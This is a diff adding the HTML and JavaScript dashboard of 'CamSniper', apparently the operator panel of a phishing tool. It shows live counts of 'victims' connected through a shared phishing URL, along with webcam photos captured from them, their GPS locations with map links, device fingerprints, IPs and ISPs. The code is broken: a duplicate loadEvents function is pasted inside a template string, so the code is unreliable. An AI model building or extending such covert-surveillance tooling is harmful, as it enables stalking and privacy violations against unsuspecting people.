@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CamSniper Dashboard</title>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; }
+  :root {
+    --bg: #0a0e1a; --surface: #111827; --surface2: #1f2937;
+    --border: rgba(255,255,255,0.06); --accent: #6366f1;
+    --green: #22c55e; --yellow: #f59e0b; --red: #ef4444;
+    --text: #f9fafb; --text2: rgba(255,255,255,0.5);
+  }
+  body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
+
+  /* Sidebar nav */
+  .layout { display:flex; height:100vh; overflow:hidden; }
+  .nav {
+    width:220px; background:var(--surface); border-right:1px solid var(--border);
+    display:flex; flex-direction:column; flex-shrink:0;
+  }
+  .nav-logo {
+    padding:20px 16px; border-bottom:1px solid var(--border);
+    font-size:17px; font-weight:700; color:var(--accent);
+    display:flex; align-items:center; gap:8px;
+  }
+  .nav-logo .logo-icon { font-size:20px; }
+  .nav-menu { padding:12px 8px; flex:1; }
+  .nav-item {
+    display:flex; align-items:center; gap:10px; padding:10px 12px;
+    border-radius:8px; cursor:pointer; font-size:14px; color:var(--text2);
+    transition:all 0.2s; margin-bottom:2px;
+  }
+  .nav-item:hover { background:rgba(255,255,255,0.05); color:var(--text); }
+  .nav-item.active { background:rgba(99,102,241,0.15); color:var(--accent); font-weight:500; }
+  .nav-item .ni-icon { font-size:16px; }
+  .nav-badge {
+    margin-left:auto; background:var(--red); color:#fff;
+    font-size:11px; padding:2px 7px; border-radius:10px; font-weight:600;
+  }
+
+  /* Main content */
+  .main { flex:1; overflow-y:auto; display:flex; flex-direction:column; }
+  .top-bar {
+    padding:14px 24px; background:var(--surface); border-bottom:1px solid var(--border);
+    display:flex; align-items:center; gap:16px; flex-shrink:0;
+  }
+  .top-bar h1 { font-size:18px; font-weight:600; }
+  .top-bar .live-dot {
+    width:8px; height:8px; border-radius:50%; background:var(--green);
+    animation:blink 1.5s ease-in-out infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .top-bar .live-text { font-size:13px; color:var(--green); }
+  .top-bar .actions { margin-left:auto; display:flex; gap:8px; }
+  .btn {
+    padding:7px 14px; border-radius:8px; font-size:13px; cursor:pointer;
+    border:none; font-family:inherit; transition:all 0.2s;
+  }
+  .btn-ghost { background:rgba(255,255,255,0.06); color:var(--text); }
+  .btn-ghost:hover { background:rgba(255,255,255,0.1); }
+  .btn-primary { background:var(--accent); color:#fff; }
+  .btn-danger { background:var(--red); color:#fff; }
+
+  /* Verification badges */
+  .verify-ok {
+    display: inline-block;
+    margin-left: 8px;
+    padding: 2px 8px;
+    background: rgba(34, 197, 94, 0.15);
+    color: #22c55e;
+    border: 1px solid #22c55e;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+  .verify-fake {
+    display: inline-block;
+    margin-left: 8px;
+    padding: 2px 8px;
+    background: rgba(239, 68, 68, 0.15);
+    color: #ef4444;
+    border: 1px solid #ef4444;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+  .suspicious-event {
+    border-left: 3px solid #ef4444;
+    background: rgba(239, 68, 68, 0.05);
+  }
+
+  /* Map link styling */
+  .map-link {
+    display: inline-block;
+    margin-top: 6px;
+    color: var(--accent);
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 13px;
+    border: 1px solid var(--accent);
+    padding: 4px 10px;
+    border-radius: 6px;
+    transition: all 0.2s;
+  }
+  .map-link:hover {
+    background: var(--accent);
+    color: #fff;
+  }
+
+  .content { padding:24px; flex:1; }
+
+  /* Stats grid */
+  .stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:24px; }
+  .stat-card {
+    background:var(--surface); border:1px solid var(--border);
+    border-radius:12px; padding:20px;
+    display:flex; flex-direction:column; gap:8px;
+  }
+  .stat-card .sc-label { font-size:12px; color:var(--text2); text-transform:uppercase; letter-spacing:0.8px; }
+  .stat-card .sc-value { font-size:28px; font-weight:700; line-height:1; }
+  .stat-card .sc-sub { font-size:12px; color:var(--text2); }
+  .stat-card .sc-icon { font-size:24px; margin-bottom:4px; }
+  .stat-card.green .sc-value { color:var(--green); }
+  .stat-card.yellow .sc-value { color:var(--yellow); }
+  .stat-card.purple .sc-value { color:var(--accent); }
+  .stat-card.red .sc-value { color:var(--red); }
+
+  /* Two column grid */
+  .two-col { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:24px; }
+
+  /* Events feed */
+  .panel {
+    background:var(--surface); border:1px solid var(--border); border-radius:12px; overflow:hidden;
+  }
+  .panel-header {
+    padding:16px 20px; border-bottom:1px solid var(--border);
+    display:flex; align-items:center; gap:8px;
+  }
+  .panel-title { font-size:15px; font-weight:600; }
+  .panel-count { font-size:12px; color:var(--text2); margin-left:auto; }
+  .panel-body { max-height:400px; overflow-y:auto; }
+
+  .event-item {
+    padding:14px 20px; border-bottom:1px solid var(--border);
+    display:flex; gap:12px; align-items:flex-start;
+    transition:background 0.2s; animation:fadeIn 0.4s ease;
+  }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(-8px)} to{opacity:1;transform:translateY(0)} }
+  .event-item:last-child { border-bottom:none; }
+  .event-item:hover { background:rgba(255,255,255,0.02); }
+  .event-icon {
+    width:36px; height:36px; border-radius:10px; flex-shrink:0;
+    display:flex; align-items:center; justify-content:center; font-size:18px;
+  }
+  .event-icon.connection { background:rgba(34,197,94,0.15); }
+  .event-icon.photo { background:rgba(139,92,246,0.15); }
+  .event-icon.location { background:rgba(245,158,11,0.15); }
+  .event-icon.device { background:rgba(99,102,241,0.15); }
+  .event-content { flex:1; }
+  .event-title { font-size:14px; font-weight:500; margin-bottom:3px; }
+  .event-detail { font-size:12px; color:var(--text2); line-height:1.5; }
+  .event-time { font-size:11px; color:var(--text2); flex-shrink:0; font-family:'JetBrains Mono',monospace; }
+
+  /* Photos grid */
+  .photos-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(140px,1fr)); gap:12px; padding:20px; }
+  .photo-thumb {
+    aspect-ratio:4/3; border-radius:10px; overflow:hidden;
+    background:var(--surface2); cursor:pointer; position:relative;
+    transition:all 0.2s;
+  }
+  .photo-thumb:hover { transform:scale(1.03); box-shadow:0 8px 24px rgba(0,0,0,0.4); }
+  .photo-thumb img { width:100%; height:100%; object-fit:cover; }
+  .photo-thumb .photo-overlay {
+    position:absolute; inset:0; background:linear-gradient(to top, rgba(0,0,0,0.7),transparent);
+    opacity:0; transition:opacity 0.2s; display:flex; align-items:flex-end; padding:8px;
+  }
+  .photo-thumb:hover .photo-overlay { opacity:1; }
+  .photo-thumb .photo-name { font-size:11px; color:#fff; word-break:break-all; }
+  .photo-empty {
+    grid-column:1/-1; text-align:center; padding:40px; color:var(--text2); font-size:14px;
+  }
+
+  /* Map placeholder */
+  .map-placeholder {
+    padding:20px; height:200px; display:flex; align-items:center; justify-content:center;
+    flex-direction:column; gap:8px; color:var(--text2); font-size:14px;
+    background:radial-gradient(ellipse at center, rgba(99,102,241,0.05), transparent);
+  }
+  .map-placeholder .mp-icon { font-size:40px; margin-bottom:4px; }
+  .location-list { padding:0; }
+  .location-item {
+    padding:14px 20px; border-bottom:1px solid var(--border);
+    display:flex; gap:12px; align-items:center;
+  }
+  .location-item:last-child { border-bottom:none; }
+  .loc-coords { font-size:13px; font-family:'JetBrains Mono',monospace; }
+  .loc-acc { font-size:12px; color:var(--text2); }
+  .loc-maps { margin-left:auto; }
+  .maps-link {
+    font-size:12px; color:var(--accent); text-decoration:none;
+    padding:4px 10px; border:1px solid rgba(99,102,241,0.3); border-radius:6px;
+  }
+  .maps-link:hover { background:rgba(99,102,241,0.1); }
+
+  /* Photo lightbox */
+  .lightbox {
+    position:fixed; inset:0; background:rgba(0,0,0,0.9);
+    display:none; align-items:center; justify-content:center; z-index:1000;
+    backdrop-filter:blur(8px);
+  }
+  .lightbox.show { display:flex; }
+  .lightbox img { max-width:90vw; max-height:90vh; border-radius:12px; box-shadow:0 40px 80px rgba(0,0,0,0.8); }
+  .lightbox-close {
+    position:absolute; top:20px; right:20px; font-size:32px; cursor:pointer;
+    color:rgba(255,255,255,0.7); background:none; border:none;
+  }
+  .lightbox-info { position:absolute; bottom:20px; left:50%; transform:translateX(-50%);
+    background:rgba(0,0,0,0.7); padding:8px 16px; border-radius:8px; font-size:13px; }
+
+  /* Empty state */
+  .empty-state { text-align:center; padding:60px 20px; color:var(--text2); }
+  .empty-state .es-icon { font-size:48px; margin-bottom:12px; opacity:0.5; }
+  .empty-state p { font-size:14px; }
+
+  @media(max-width:900px){
+    .stats-grid{grid-template-columns:repeat(2,1fr);}
+    .two-col{grid-template-columns:1fr;}
+  }
+  @media(max-width:600px){
+    .nav{display:none;}
+    .stats-grid{grid-template-columns:repeat(2,1fr);}
+  }
+</style>
+</head>
+<body>
+
+<!-- Lightbox -->
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+  <button class="lightbox-close" onclick="closeLightbox()">✕</button>
+  <img id="lbImg" src="" alt="">
+  <div class="lightbox-info" id="lbInfo"></div>
+</div>
+
+<div class="layout">
+  <nav class="nav">
+    <div class="nav-logo"><span class="logo-icon">📷</span> CamSniper</div>
+    <div class="nav-menu">
+      <div class="nav-item active" onclick="showTab('events')">
+        <span class="ni-icon">📊</span> Live Feed
+        <span class="nav-badge" id="evtBadge">0</span>
+      </div>
+      <div class="nav-item" onclick="showTab('photos')">
+        <span class="ni-icon">🖼️</span> Photos
+        <span class="nav-badge" id="photoBadge">0</span>
+      </div>
+      <div class="nav-item" onclick="showTab('locations')">
+        <span class="ni-icon">📍</span> Locations
+      </div>
+      <div class="nav-item" onclick="showTab('sessions')">
+        <span class="ni-icon">👥</span> Sessions
+      </div>
+    </div>
+  </nav>
+
+  <div class="main">
+    <div class="top-bar">
+      <h1>CamSniper Dashboard</h1>
+      <div class="live-dot"></div>
+      <span class="live-text">LIVE</span>
+      <div class="actions">
+        <button class="btn btn-ghost" onclick="location.reload()">🔄 Refresh</button>
+        <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear</button>
+      </div>
+    </div>
+
+    <div class="content">
+      <!-- Stats -->
+      <div class="stats-grid">
+        <div class="stat-card green">
+          <div class="sc-icon">🔗</div>
+          <div class="sc-label">Connections</div>
+          <div class="sc-value" id="statConnections">0</div>
+          <div class="sc-sub">Total victims connected</div>
+        </div>
+        <div class="stat-card purple">
+          <div class="sc-icon">📷</div>
+          <div class="sc-label">Photos</div>
+          <div class="sc-value" id="statPhotos">0</div>
+          <div class="sc-sub">Webcam shots captured</div>
+        </div>
+        <div class="stat-card yellow">
+          <div class="sc-icon">📍</div>
+          <div class="sc-label">Locations</div>
+          <div class="sc-value" id="statLocations">0</div>
+          <div class="sc-sub">GPS coords obtained</div>
+        </div>
+        <div class="stat-card red">
+          <div class="sc-icon">🖥️</div>
+          <div class="sc-label">Devices</div>
+          <div class="sc-value" id="statDevices">0</div>
+          <div class="sc-sub">Fingerprints collected</div>
+        </div>
+      </div>
+
+      <!-- Events Tab -->
+      <div id="tab-events">
+        <div class="panel">
+          <div class="panel-header">
+            <span>⚡</span>
+            <span class="panel-title">Live Capture Feed</span>
+            <span class="panel-count" id="evtCount">0 events</span>
+          </div>
+          <div class="panel-body" id="eventFeed">
+            <div class="empty-state">
+              <div class="es-icon">📡</div>
+              <p>Waiting for connections...<br>Share the phishing URL to start capturing</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Photos Tab -->
+      <div id="tab-photos" style="display:none">
+        <div class="panel">
+          <div class="panel-header">
+            <span>🖼️</span>
+            <span class="panel-title">Captured Photos</span>
+            <span class="panel-count" id="photoCount">0 photos</span>
+          </div>
+          <div class="photos-grid" id="photosGrid">
+            <div class="photo-empty">
+              <div style="font-size:40px;margin-bottom:8px">📷</div>
+              No photos captured yet
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Locations Tab -->
+      <div id="tab-locations" style="display:none">
+        <div class="panel">
+          <div class="panel-header">
+            <span>📍</span>
+            <span class="panel-title">GPS Locations</span>
+          </div>
+          <div class="location-list" id="locationList">
+            <div class="empty-state">
+              <div class="es-icon">🗺️</div>
+              <p>No GPS data yet</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Sessions Tab -->
+      <div id="tab-sessions" style="display:none">
+        <div class="panel">
+          <div class="panel-header">
+            <span>👥</span>
+            <span class="panel-title">Sessions</span>
+          </div>
+          <div class="panel-body" id="sessionList">
+            <div class="empty-state">
+              <div class="es-icon">👤</div>
+              <p>No sessions yet</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const socket = io('/dashboard');
+let allEvents = [], allPhotos = [], allLocations = [], allSessions = [];
+let stats = {connections:0, photos:0, locations:0, devices:0};
+
+// Tabs
+function showTab(name) {
+  ['events','photos','locations','sessions'].forEach(t => {
+    document.getElementById('tab-'+t).style.display = (t===name)?'block':'none';
+  });
+  document.querySelectorAll('.nav-item').forEach((el,i) => {
+    el.classList.toggle('active', ['events','photos','locations','sessions'][i]===name);
+  });
+  if(name==='photos') loadPhotos();
+  if(name==='sessions') loadSessions();
+}
+
+// Load existing events
+async function loadEvents() {
+  try {
+    const r = await fetch('/api/events');
+    const events = await r.json();
+    events.forEach(ev => addEvent(ev, false));
+    updateStats();
+  } catch(e){}
+}
+
+async function loadPhotos() {
+  try {
+    const r = await fetch('/api/photos');
+    allPhotos = await r.json();
+    renderPhotos();
+  } catch(e){}
+}
+
+async function loadSessions() {
+  try {
+    const r = await fetch('/api/sessions');
+    allSessions = await r.json();
+    renderSessions();
+  } catch(e){}
+}
+
+function renderLocations() {
+  const list = document.getElementById('locationList');
+  if(!allLocations.length){
+    list.innerHTML='<div class="empty-state"><div class="es-icon">🗺️</div><p>No GPS data yet</p></div>';
+    return;
+  }
+  list.innerHTML = allLocations.map(loc=>{
+    const mapLink = loc.maps_url ? `<br><a href="${loc.maps_url}" target="_blank" class="map-link">🗺️ Open in Google Maps</a>` : '';
+    const ts = new Date(loc.timestamp).toLocaleString();
+    const verified = loc.location_verified !== false;
+    const suspicion = loc.suspicion_reason || '';
+    const verifyBadge = verified
+      ? `<span class="verify-ok">✓ Verified</span>`
+      : `<span class="verify-fake">✗ ${suspicion.replace('_', ' ').toUpperCase()}</span>`;
+    const dist = loc.distance_km ? ` · ${loc.distance_km}km from IP` : '';
+    return `
+      <div class="event-item${verified ? '' : ' suspicious-event'}">
+async function loadEvents() {
+  try {
+    const r = await fetch('/api/events');
+    let events = await r.json();
+    // Limit initial event load to 50 events for performance
+    events = events.slice(-50);
+    events.forEach(ev => addEvent(ev, false));
+    updateStats();
+  } catch(e){}
+}
+        <div class="event-icon location">${verified ? '📍' : '⚠️'}</div>
+        <div class="event-content">
+          <div class="event-title">${verified ? 'GPS Location' : '⚠️ Suspicious Location'} — ${ts}</div>
+          <div class="event-detail">
+            Lat: ${loc.latitude} · Lon: ${loc.longitude} · Accuracy: ${loc.accuracy}m · Source: ${loc.source||'gps'}${dist}${mapLink} ${verifyBadge}
+          </div>
+        </div>
+        <div class="event-time">${loc.session_id||''}</div>
+      </div>
+    `;
+  }).join('');
+}
+
+function addEvent(ev, animate=true) {
+  allEvents.push(ev);
+  const feed = document.getElementById('eventFeed');
+  // Remove empty state
+  const empty = feed.querySelector('.empty-state');
+  if(empty) empty.remove();
+
+  const el = document.createElement('div');
+  el.className = 'event-item';
+  if(!animate) el.style.animation = 'none';
+
+  const ts = new Date(ev.timestamp).toLocaleTimeString();
+  let iconClass='', iconEmoji='', title='', detail='';
+
+  if(ev.type==='connection'){
+    iconClass='connection'; iconEmoji='🔗';
+    title = `New connection from ${ev.ip||'Unknown'}`;
+    const geo = ev.geo||{};
+    detail = [geo.city,geo.country,geo.isp].filter(Boolean).join(' · ')
+      + `\n${(ev.user_agent||'').substring(0,60)}`;
+    stats.connections++;
+  } else if(ev.type==='photo'){
+    iconClass='photo'; iconEmoji='📷';
+    title = `Photo captured — ${ev.camera_facing||'front'} camera`;
+    detail = `File: ${ev.filename||'?'} · Session: ${(ev.session_id||'').substring(0,16)}`;
+    stats.photos++;
+    document.getElementById('photoBadge').textContent = stats.photos;
+  } else if(ev.type==='location'){
+    iconClass='location'; iconEmoji='📍';
+    const verified = ev.location_verified !== false;
+    const suspicion = ev.suspicion_reason || '';
+    title = verified ? 'GPS location obtained' : '⚠️ Suspicious location';
+    const mapLink = ev.maps_url ? `<br><a href="${ev.maps_url}" target="_blank" class="map-link">🗺️ Open in Google Maps</a>` : '';
+    const verifyBadge = verified
+      ? `<span class="verify-ok">✓ Verified</span>`
+      : `<span class="verify-fake">✗ ${suspicion.replace('_', ' ').toUpperCase()}</span>`;
+    const dist = ev.distance_km ? ` · ${ev.distance_km}km from IP` : '';
+    detail = `Lat: ${ev.latitude} · Lon: ${ev.longitude} · Accuracy: ${ev.accuracy}m · Source: ${ev.source||'gps'}${dist}${mapLink} ${verifyBadge}`;
+    stats.locations++;
+    allLocations.push(ev);
+    renderLocations();
+  } else if(ev.type==='device_info'){
+    iconClass='device'; iconEmoji='🖥️';
+    title = 'Device fingerprint captured';
+    const fp = ev.fingerprint||{};
+    detail = `Platform: ${fp.platform||'?'} · Timezone: ${fp.timezone||'?'}`;
+    stats.devices++;
+  }
+
+  el.innerHTML = `
+    <div class="event-icon ${iconClass}">${iconEmoji}</div>
+    <div class="event-content">
+      <div class="event-title">${title}</div>
+      <div class="event-detail" style="white-space:pre-line">${detail}</div>
+    </div>
+    <div class="event-time">${ts}</div>
+  `;
+  feed.insertBefore(el, feed.firstChild);
+  updateStats();
+  const cnt = document.getElementById('evtBadge');
+  cnt.textContent = allEvents.length;
+  document.getElementById('evtCount').textContent = allEvents.length + ' events';
+}
+
+function updateStats() {
+  document.getElementById('statConnections').textContent = stats.connections;
+  document.getElementById('statPhotos').textContent = stats.photos;
+  document.getElementById('statLocations').textContent = stats.locations;
+  document.getElementById('statDevices').textContent = stats.devices;
+}
+
+function renderPhotos() {
+  const grid = document.getElementById('photosGrid');
+  document.getElementById('photoCount').textContent = allPhotos.length + ' photos';
+  document.getElementById('photoBadge').textContent = allPhotos.length;
+  if(!allPhotos.length){
+    grid.innerHTML='<div class="photo-empty"><div style="font-size:40px;margin-bottom:8px">📷</div>No photos captured yet</div>';
+    return;
+  }
+  grid.innerHTML = allPhotos.map(p=>`
+    <div class="photo-thumb" onclick="openLightbox('${p.url}','${p.filename}')">
+      <img src="${p.url}" alt="${p.filename}" loading="lazy" onerror="this.style.display='none'">
+      <div class="photo-overlay"><div class="photo-name">${p.filename}</div></div>
+    </div>
+  `).join('');
+}
+
+function renderSessions() {
+  const list = document.getElementById('sessionList');
+  if(!allSessions.length){
+    list.innerHTML='<div class="empty-state"><div class="es-icon">👤</div><p>No sessions yet</p></div>';
+    return;
+  }
+  list.innerHTML = allSessions.map(s=>{
+    const geo = s.geo||{};
+    return `
+      <div class="event-item">
+        <div class="event-icon connection">👤</div>
+        <div class="event-content">
+          <div class="event-title">${s.ip||'Unknown IP'} — ${[geo.city,geo.country].filter(Boolean).join(', ')}</div>
+          <div class="event-detail">
+            ISP: ${geo.isp||'?'} · Template: ${s.template||'?'}<br>
+            ${(s.user_agent||'').substring(0,80)}
+          </div>
+        </div>
+        <div class="event-time">${s.session_id||''}</div>
+      </div>
+    `;
+  }).join('');
+}
+
+// Lightbox
+function openLightbox(url, name) {
+  document.getElementById('lbImg').src = url;
+  document.getElementById('lbInfo').textContent = name;
+  document.getElementById('lightbox').classList.add('show');
+}
+function closeLightbox() {
+  document.getElementById('lightbox').classList.remove('show');
+}
+document.getElementById('lightbox').addEventListener('click', function(e){
+  if(e.target===this) closeLightbox();
+});
+
+function clearAll() {
+  if(!confirm('Clear all event data from the display?')) return;
+  document.getElementById('eventFeed').innerHTML='<div class="empty-state"><div class="es-icon">📡</div><p>Cleared. Waiting...</p></div>';
+  allEvents=[];
+  document.getElementById('evtBadge').textContent='0';
+  document.getElementById('evtCount').textContent='0 events';
+}
+
+// Real-time updates via SocketIO
+socket.on('new_event', ev => {
+  addEvent(ev, true);
+  if(ev.type==='photo') loadPhotos();
+});
+
+// Initial load
+loadEvents();
+</script>
+</body>
+</html>
